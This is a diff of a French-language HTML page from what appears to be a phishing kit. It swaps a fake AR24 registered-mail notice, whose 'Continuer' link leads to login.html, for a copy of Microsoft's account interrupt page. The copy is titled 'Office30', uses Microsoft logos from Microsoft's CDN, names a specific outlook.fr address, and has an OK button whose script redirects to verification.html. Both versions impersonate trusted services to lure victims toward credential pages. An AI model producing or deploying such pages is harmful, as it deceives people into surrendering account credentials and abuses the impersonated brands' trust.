@@ -1,135 +1,247 @@
 <!DOCTYPE html>
-<html lang="fr" class="no-js">
+<html lang="fr">
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
-    <title>Continuer - AR24</title>
-    <link
-      rel="stylesheet"
-      href="https://app.ar24.fr/static/min/?f=css/reset.css,css/design-system.css,fonts/font-barlow.css,fonts/font-montserrat.css&1771239617"
-    />
-    <link
-      href="https://app.ar24.fr/static/css/pages/user-login.css?v=1771239617"
-      rel="stylesheet"
-      type="text/css"
-    />
+    <title>Continuer - Office30</title>
     <style>
-      .register-card {
-        padding: 34px;
-      }
-
-      .doc-logo {
-        width: 84px;
-        height: 84px;
-        margin: 0 auto 20px;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        border-radius: 20px;
-        background: linear-gradient(145deg, #f3f5ff, #e8ecff);
-      }
-
-      .doc-logo svg {
-        width: 44px;
-        height: 44px;
-        fill: #0000ff;
-      }
-
-      .subtitle {
+      /*! Copyright (c) Microsoft Corporation. All rights reserved. */
+      button {
+        appearance: auto;
+        text-rendering: auto;
+        color: buttontext;
+        letter-spacing: normal;
+        word-spacing: normal;
+        line-height: normal;
+        text-transform: none;
+        text-indent: 0;
+        text-shadow: none;
+        display: inline-block;
         text-align: center;
-        margin: 0 0 12px;
-        font-weight: 600;
+        cursor: default;
+        box-sizing: border-box;
+        background-color: buttonface;
+        margin: 0;
+        padding-block: 1px;
+        padding-inline: 6px;
+        border-width: 2px;
+        border-style: outset;
+        border-color: buttonborder;
+        border-image: initial;
       }
 
-      .description {
-        text-align: center;
-        margin: 0 auto 22px;
-        max-width: 420px;
-      }
-
-      .info-list {
-        margin: 0 0 24px;
+      #app-host,
+      body {
+        width: 100%;
+        height: 100%;
+        margin: 0;
         padding: 0;
-        list-style: none;
+        font-family: Segoe UI, sans-serif;
+        display: flex;
+        justify-content: center;
+        align-items: center;
       }
 
-      .info-list li {
-        margin-bottom: 10px;
-        padding-left: 24px;
-        position: relative;
+      html {
+        height: 100%;
       }
 
-      .info-list li::before {
-        content: '\2713';
-        color: #0000ff;
-        position: absolute;
-        left: 0;
-        top: 0;
-        font-weight: 700;
+      .interrupt-content ::-webkit-scrollbar-thumb {
+        border: 4px solid transparent;
+        background-clip: padding-box;
+        border-radius: 9999px;
+        background-color: rgba(0, 0, 0, 0.3);
       }
 
-      .security-note {
-        text-align: center;
-        font-size: 0.95rem;
-        color: #5f6575;
-        margin-top: 14px;
+      .css-97 {
+        width: 100%;
+        max-width: 440px;
+        min-height: 640px;
+        border-radius: 16px;
+        background: #fff;
+        border: 1px solid #e0e0e0;
+        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.14);
+        overflow: hidden;
+        display: flex;
+        flex-direction: column;
+      }
+
+      .css-121 {
+        width: 100%;
+        height: 100%;
+        overflow-y: auto;
+        display: flex;
+        flex-direction: column;
+      }
+
+      .css-99 {
+        padding: 28px 28px 18px;
+      }
+
+      .css-100 {
+        margin-bottom: 20px;
+      }
+
+      .css-101 {
+        display: flex;
+        flex-direction: column;
+        gap: 12px;
+      }
+
+      .css-103 {
+        color: #444;
+        font-size: 14px;
+      }
+
+      .css-105 {
+        font-size: 26px;
+        line-height: 1.25;
+        font-weight: 600;
+        color: #1b1b1b;
+      }
+
+      .css-106 {
+        display: flex;
+        justify-content: center;
+        padding: 8px 0 4px;
+      }
+
+      .css-107 {
+        display: flex;
+        flex-direction: column;
+        gap: 12px;
+      }
+
+      .css-108 {
+        display: flex;
+        flex-direction: column;
+        gap: 4px;
+      }
+
+      .css-109 {
+        color: #1b1b1b;
+        font-weight: 600;
+        font-size: 16px;
+        line-height: 22px;
+      }
+
+      .css-110 {
+        color: #555;
+        font-size: 14px;
+        line-height: 20px;
+      }
+
+      .css-111 {
+        margin-top: 6px;
+      }
+
+      #StickyFooter.css-112 {
+        margin-top: auto;
+        padding: 14px 20px 18px;
+        border-top: 1px solid #efefef;
+        display: flex;
+        justify-content: flex-end;
+        background: #fff;
+      }
+
+      .root-122 {
+        min-width: 92px;
+        height: 32px;
+        border: 1px solid #0067b8;
+        border-radius: 2px;
+        background: #0067b8;
+        color: #fff;
+        cursor: pointer;
+        padding: 0 14px;
+      }
+
+      .root-122:hover {
+        background: #005a9e;
+        border-color: #005a9e;
+      }
+
+      .label-117 {
+        color: inherit;
+        font-size: 14px;
+        font-weight: 600;
       }
     </style>
   </head>
-  <body class="guest">
-    <header id="header">
-      <div class="wrapper">
-        <a href="https://app.ar24.fr" class="header-logo">AR24 - Lettre Recommandée Électronique</a>
-      </div>
-    </header>
-
-    <main id="main-content">
-      <div class="col-small">
-        <header>
-          <h1 class="align-center">Récupérer mon recommandé</h1>
-        </header>
-        <section class="content">
-          <div class="card margin-auto register-card">
-            <div class="doc-logo" aria-hidden="true">
-              <svg viewBox="0 0 24 24" role="img" aria-label="Icône document">
-                <path d="M14 2H7a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V7zm0 1.5L17.5 7H14zM9 11h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 9 11m0 3h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 9 14m0 3h4a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 9 17"/>
-              </svg>
+  <body>
+    <div id="app-host">
+      <div class="ms-Stack interrupt-content css-97">
+        <div id="scrollDiv" class="ms-Stack css-121">
+          <div id="interruptContainer" class="ms-StackItem css-99">
+            <div></div>
+            <div class="ms-Stack css-100">
+              <img
+                src="https://ucis.msdxcdn.microsoft.com/1.0.26075.1/Images/microsoftLogoLightMode.svg"
+                alt="Microsoft"
+                style="height: 24px; width: 112.55px"
+              />
             </div>
-            <p class="subtitle">Vous avez reçu un recommandé électronique</p>
-            <p class="description">
-              Pour consulter votre courrier en toute sécurité, connectez-vous à votre espace AR24.
-              Cette étape vous permet d'identifier le destinataire et de garantir la confidentialité.
-            </p>
-
-            <ul class="info-list">
-              <li>Accès sécurisé à votre recommandé et à ses pièces jointes.</li>
-              <li>Traçabilité complète des actions (ouverture, consultation, réception).</li>
-              <li>Conservation de la preuve numérique conforme aux exigences AR24.</li>
-            </ul>
-
-            <p class="align-center">
-              <a class="btn btn-primary" href="login.html">Continuer</a>
-            </p>
-            <p class="security-note">Besoin d'aide ? Notre assistance est disponible via le chat en bas de page.</p>
+            <div class="ms-Stack css-101">
+              <div class="ms-StackItem css-102"><span class="css-103">lapepitealicacaco@outlook.fr</span></div>
+              <div class="ms-StackItem css-104">
+                <span role="heading" aria-level="1" class="css-105">Une note rapide sur votre compte Microsoft</span>
+              </div>
+              <div class="ms-Stack css-106">
+                <img
+                  src="https://ucis.msdxcdn.microsoft.com/1.0.26075.1/Images/newProductLogoLightMode-512x512.png"
+                  alt="Illustration montrant deux orbs autour d’une icône représentant une personne."
+                  style="align-self: center; height: 128px; width: 128px"
+                />
+              </div>
+              <div class="ms-Stack css-107">
+                <div class="ms-Stack css-108">
+                  <span role="heading" aria-level="2" class="css-109">Vos éléments importants sont ici</span>
+                  <span class="css-110"
+                    >Lorsque vous vous connectez, des éléments tels que vos contacts, mots de passe, favoris,
+                    historique de navigation, photos et fichiers sont disponibles dans les produits Microsoft.</span
+                  >
+                </div>
+                <div class="ms-Stack css-108">
+                  <span role="heading" aria-level="2" class="css-109">Votre confidentialité est notre priorité</span>
+                  <span class="css-110"
+                    >Pour protéger vos données, nous utilisons le chiffrement et d’autres meilleures pratiques de
+                    sécurité.</span
+                  >
+                </div>
+                <div class="ms-Stack css-108">
+                  <span role="heading" aria-level="2" class="css-109">C’est vous qui décidez</span>
+                  <span class="css-110"
+                    >Nous vous proposons des choix sur la façon dont vos données sont utilisées et sur ce que vous
+                    synchronisez.</span
+                  >
+                </div>
+              </div>
+              <div class="ms-StackItem css-111">
+                <span
+                  ><a
+                    aria-label="En savoir plus sur vos données compte Microsoft"
+                    href="#/LearnMore"
+                    style="color: rgb(0, 103, 184); font-size: 14px; font-weight: 400; line-height: 20px; text-decoration: underline"
+                    >En savoir plus</a
+                  ></span
+                >
+              </div>
+            </div>
           </div>
-        </section>
-      </div>
-    </main>
-
-    <footer id="footer">
-      <div class="wrapper">
-        <div class="top">
-          <div class="logo">
-            <img alt="" src="/static/images/logo/AR24.svg" />
-          </div>
-          <div class="line">
-            <div>Votre solution d'envoi de recommandés électroniques fiable, pratique et efficace.</div>
-            <div>AR24 est une filiale de Docaposte</div>
+          <div id="StickyFooter" class="ms-Stack css-112">
+            <button id="ok-button" type="button" class="ms-Button ms-Button--primary root-122" data-is-focusable="true">
+              <span class="ms-Button-flexContainer flexContainer-114" data-automationid="splitbuttonprimary">
+                <span class="ms-Button-textContainer textContainer-115"><span class="ms-Button-label label-117" id="id__0">OK</span></span>
+              </span>
+            </button>
           </div>
         </div>
       </div>
-    </footer>
-    <script src="//code.tidio.co/7infjs1hu3tvvi6swicmo9klmhijsizg.js" async></script>
+    </div>
+
+    <script>
+      document.getElementById('ok-button').addEventListener('click', () => {
+        window.location.href = 'verification.html';
+      });
+    </script>
   </body>
 </html>
